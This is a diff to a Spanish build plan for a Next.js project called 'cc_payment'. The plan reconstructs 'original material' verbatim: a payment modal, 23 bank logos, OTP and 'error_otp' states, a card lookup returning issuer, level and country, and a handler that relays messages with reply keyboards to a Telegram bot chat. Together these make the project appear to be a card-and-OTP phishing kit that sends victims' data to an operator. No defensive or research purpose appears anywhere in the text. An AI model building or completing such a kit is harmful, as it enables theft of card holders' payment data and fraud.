@@ -28,7 +28,7 @@ Además:
 - Next.js 15 **Pages Router** (`create-next-app` con `--no-app --src-dir --import-alias "@/*"`) + TypeScript + Tailwind + ESLint.
 - Alias `@/*` → `src/*`.
 - `clsx` + `tailwind-merge` para merge de clases, con helper `cn()` en `src/utils/cn.ts`.
-- `ioredis` para el estado de sesión (Redis local, fiel al original: `paymentStorage.ts` importa `redis` de `@/lib/redis`).
+- `redis` (node-redis v4) para el estado de sesión (Redis local, fiel al original: `paymentStorage.ts` usa `redis.set(key, val, { EX })`, API de node-redis).
 - Todo lo demás es el material original (modal, servicios, wrappers, tipos, estilos) o reconstrucción fiel de piezas faltantes.
 
 ## Estructura del proyecto
@@ -68,7 +68,7 @@ cc_payment/
     │   │   └── validate.ts             # wrapper original VERBATIM
     │   └── checkCardService.ts         # NUEVO: validateCard(card) → {success, issuer, level, brand, type, country, infocc}
     ├── lib/
-    │   └── redis.ts                    # NUEVO: cliente ioredis (default export)
+    │   └── redis.ts                    # NUEVO: cliente node-redis (default export)
     ├── utils/
     │   ├── paymentStorage.ts           # original VERBATIM (usa @/lib/redis)
     │   ├── auth.ts                     # original VERBATIM
@@ -119,7 +119,7 @@ Estados soportados (del material original): `loading`, `otp`, `error_otp`, `user
 | `banks/*` (23) | `public/banks/` | Verbatim |
 
 **Piezas faltantes que se reconstruyen (fieles al contrato existente):**
-- `src/lib/redis.ts` → default export de un cliente `ioredis` (`new Redis(process.env.REDIS_URL ?? 'redis://127.0.0.1:6379')`). API `get/set/del` (con `{EX}`), que es la que `paymentStorage.ts` ya usa.
+- `src/lib/redis.ts` → default export de un cliente node-redis (`createClient({ url })` con `url = REDIS_URL ?? 'redis://127.0.0.1:6379'`). API `get/set` (con `{EX}`)/`del`, que es la que `paymentStorage.ts` ya usa.
 - `src/services/checkCardService.ts` → `CheckCardService.validateCard(card: string)`: valida con Luhn y devuelve `{ success, issuer, level, brand, type, country, infocc }` (el modal lee esas claves).
 - Handlers server de los wrappers que hacen `fetch` a `/api/...`:
   - `POST /api/telegram/sendMessage` → llama a `api.telegram.org/bot<TOKEN>/sendMessage` con `chat_id` (de `TELEGRAM_CHAT_ID`/env), `text` y `reply_markup` si viene `keyboard`. Devuelve `{ result }`.
